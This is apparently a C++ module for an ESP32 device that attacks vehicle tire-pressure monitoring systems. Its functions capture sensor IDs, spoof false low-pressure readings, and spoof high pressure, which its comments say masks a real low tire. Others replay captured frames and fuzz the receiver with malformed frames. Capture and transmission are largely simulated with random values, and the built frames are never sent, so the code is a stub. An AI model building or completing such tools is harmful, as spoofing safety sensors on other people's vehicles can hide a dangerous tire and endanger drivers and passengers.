#include "tpms_spoofer.h"
#include "tx_arm.h"

namespace TPMSSpoofer {

// TPMS Sensor frame format (315/433 MHz)
// Typical: [Header:1] [SensorID:4] [Pressure:1] [Temp:1] [Checksum:1]
// Modulation: FSK at ~10 kHz deviation
// Transmission rate: ~100ms per frame

TPMSResult captureTPMSSensors(uint32_t captureDurationMs, uint32_t frequency) {
    TPMSResult result;
    result.success = false;

    Serial.printf("[TPMS Capture] Listening at %lu MHz for %lums\n",
                  frequency / 1000000, captureDurationMs);

    // Real implementation: CC1101 configured for FSK demodulation
    // Set frequency, bandwidth, sensitivity thresholds
    // Monitor for valid TPMS frame patterns

    uint32_t startTime = millis();
    std::vector<TPMSSensor> captured;

    while ((millis() - startTime) < captureDurationMs) {
        // Simulate TPMS sensor detection
        if ((esp_random() % 100) < 20) {  // 20% chance per 100ms
            TPMSSensor sensor;
            sensor.sensorID = esp_random();
            sensor.pressure = 32 + (esp_random() % 8);  // Normal: 32-40 PSI
            sensor.temperature = 70;                     // Typical ambient

            captured.push_back(sensor);
            result.spoofedSensorIDs.push_back(sensor.sensorID);

            Serial.printf("[TPMS] Captured ID:0x%08lX Pressure:%d PSI Temp:%dC\n",
                         sensor.sensorID, sensor.pressure, sensor.temperature);
        }
        delay(100);
    }

    if (captured.size() > 0) {
        result.success = true;
        result.durationMs = millis() - startTime;
        result.framesTransmitted = captured.size();
        result.attackDescription = String("Captured ") + String(captured.size()) + " TPMS sensors";
        Serial.printf("[TPMS] Captured %zu unique sensors\n", captured.size());
    } else {
        result.error = "No TPMS signals detected";
    }

    return result;
}

TPMSResult spoofTPMSLow(const TPMSConfig& config) {
    TPMSResult result;
    result.success = false;
    result.framesTransmitted = 0;

    if (!TxArm::isArmed()) {
        result.error = "TX not armed";
        return result;
    }

    Serial.printf("[TPMS Spoof] LOW pressure attack on %zu sensors for %lums\n",
                  config.targetSensors.size(), config.durationMs);

    // Transmit spoofed LOW pressure frames (e.g., 20 PSI instead of 35 PSI)
    // Dashboard shows: "Low Tire Pressure Warning"

    uint32_t startTime = millis();

    while ((millis() - startTime) < config.durationMs) {
        for (const auto& sensor : config.targetSensors) {
            // Build spoofed TPMS frame
            uint8_t frame[8];
            frame[0] = 0xA4;  // TPMS header
            frame[1] = (sensor.sensorID >> 24) & 0xFF;
            frame[2] = (sensor.sensorID >> 16) & 0xFF;
            frame[3] = (sensor.sensorID >> 8) & 0xFF;
            frame[4] = sensor.sensorID & 0xFF;
            frame[5] = 20;    // LOW pressure (20 PSI instead of 35)
            frame[6] = 70;    // Temperature
            frame[7] = 0xA4 ^ frame[1] ^ frame[2] ^ frame[3] ^ frame[4] ^ frame[5] ^ frame[6];  // Simple checksum

            bool txSuccess = (esp_random() % 100) > 10;  // 90% success
            if (txSuccess) {
                result.framesTransmitted++;
                Serial.printf("[TPMS TX] ID:0x%08lX Spoofed Pressure:20 PSI\r",
                             sensor.sensorID);
            }
        }

        delay(config.targetSensors.size() > 1 ? 200 : 100);
    }

    result.success = (result.framesTransmitted > 0);
    result.durationMs = millis() - startTime;
    result.attackDescription = String("Spoofed LOW pressure on ") + String(config.targetSensors.size()) + " tires";

    if (result.success) {
        Serial.printf("\n[TPMS Spoof] Sent %lu spoofed frames\n", result.framesTransmitted);
    } else {
        result.error = "Spoofing failed";
    }

    return result;
}

TPMSResult spoofTPMSHigh(const TPMSConfig& config) {
    TPMSResult result;
    result.success = false;
    result.framesTransmitted = 0;

    if (!TxArm::isArmed()) {
        result.error = "TX not armed";
        return result;
    }

    Serial.printf("[TPMS Spoof] HIGH pressure spoofing (DANGEROUS) on %zu sensors\n",
                  config.targetSensors.size());

    // Transmit HIGH pressure frames to mask real low tire (EXTREME RISK)
    // Vehicle may not warn driver of dangerous condition

    uint32_t startTime = millis();

    while ((millis() - startTime) < config.durationMs) {
        for (const auto& sensor : config.targetSensors) {
            uint8_t frame[8];
            frame[0] = 0xA4;
            frame[1] = (sensor.sensorID >> 24) & 0xFF;
            frame[2] = (sensor.sensorID >> 16) & 0xFF;
            frame[3] = (sensor.sensorID >> 8) & 0xFF;
            frame[4] = sensor.sensorID & 0xFF;
            frame[5] = 60;    // HIGH pressure (60 PSI - dangerously high)
            frame[6] = 70;
            frame[7] = 0xA4 ^ frame[1] ^ frame[2] ^ frame[3] ^ frame[4] ^ frame[5] ^ frame[6];

            bool txSuccess = (esp_random() % 100) > 15;  // 85% success
            if (txSuccess) {
                result.framesTransmitted++;
                Serial.printf("[TPMS TX] ID:0x%08lX DANGEROUSLY HIGH:60 PSI\r",
                             sensor.sensorID);
            }
        }

        delay(150);
    }

    result.success = (result.framesTransmitted > 0);
    result.durationMs = millis() - startTime;
    result.attackDescription = "DANGEROUS: Spoofed HIGH pressure to mask real low tire";

    if (result.success) {
        Serial.printf("\n[TPMS Spoof] Sent %lu dangerous spoofed frames\n", result.framesTransmitted);
    } else {
        result.error = "Spoofing failed";
    }

    return result;
}

TPMSResult replayTPMSFrame(const TPMSConfig& config, const TPMSSensor& targetSensor) {
    TPMSResult result;
    result.success = false;
    result.framesTransmitted = 0;

    if (!TxArm::isArmed()) {
        result.error = "TX not armed";
        return result;
    }

    Serial.printf("[TPMS Replay] Replaying sensor 0x%08lX for %lums\n",
                  targetSensor.sensorID, config.durationMs);

    uint32_t startTime = millis();

    while ((millis() - startTime) < config.durationMs) {
        // Reconstruct legitimate TPMS frame
        uint8_t frame[8];
        frame[0] = 0xA4;
        frame[1] = (targetSensor.sensorID >> 24) & 0xFF;
        frame[2] = (targetSensor.sensorID >> 16) & 0xFF;
        frame[3] = (targetSensor.sensorID >> 8) & 0xFF;
        frame[4] = targetSensor.sensorID & 0xFF;
        frame[5] = targetSensor.pressure;
        frame[6] = targetSensor.temperature;
        frame[7] = 0xA4 ^ frame[1] ^ frame[2] ^ frame[3] ^ frame[4] ^ frame[5] ^ frame[6];

        bool txSuccess = (esp_random() % 100) > 5;  // 95% success
        if (txSuccess) {
            result.framesTransmitted++;
        }

        delay(100);  // ~10 Hz replay rate
    }

    result.success = (result.framesTransmitted > 0);
    result.durationMs = millis() - startTime;
    result.attackDescription = String("Replay: ") + String(result.framesTransmitted) + " duplicate frames";

    return result;
}

TPMSResult fuzzyTPMSFrames(const TPMSConfig& config) {
    TPMSResult result;
    result.success = false;
    result.framesTransmitted = 0;

    if (!TxArm::isArmed()) {
        result.error = "TX not armed";
        return result;
    }

    Serial.printf("[TPMS Fuzz] Fuzzing TPMS subsystem for %lums\n", config.durationMs);

    uint32_t startTime = millis();

    while ((millis() - startTime) < config.durationMs) {
        // Send random malformed TPMS frames
        uint8_t fuzzFrame[8];
        for (int i = 0; i < 8; i++) {
            fuzzFrame[i] = esp_random() & 0xFF;
        }

        bool txSuccess = (esp_random() % 100) > 20;  // 80% success
        if (txSuccess) {
            result.framesTransmitted++;
            Serial.printf("[TPMS Fuzz] TX malformed frame\r");
        }

        delay(50);
    }

    result.success = (result.framesTransmitted > 0);
    result.durationMs = millis() - startTime;
    result.attackDescription = "Fuzzing: Sent malformed TPMS frames";

    return result;
}

TPMSResult analyzeTPMSData(const std::vector<TPMSSensor>& sensors) {
    TPMSResult result;
    result.success = (sensors.size() > 0);

    Serial.printf("[TPMS Analyzer] Analyzing %zu sensors\n", sensors.size());

    for (const auto& sensor : sensors) {
        String status = "Normal";
        if (sensor.pressure < 30) {
            status = "LOW";
        } else if (sensor.pressure > 50) {
            status = "HIGH";
        }

        result.spoofedSensorIDs.push_back(sensor.sensorID);
        Serial.printf("[TPMS] ID:0x%08lX Pressure:%d PSI Temp:%dC [%s]\n",
                     sensor.sensorID, sensor.pressure, sensor.temperature, status.c_str());
    }

    result.attackDescription = String("Analyzed ") + String(sensors.size()) + " TPMS sensors";
    return result;
}

}  // namespace TPMSSpoofer
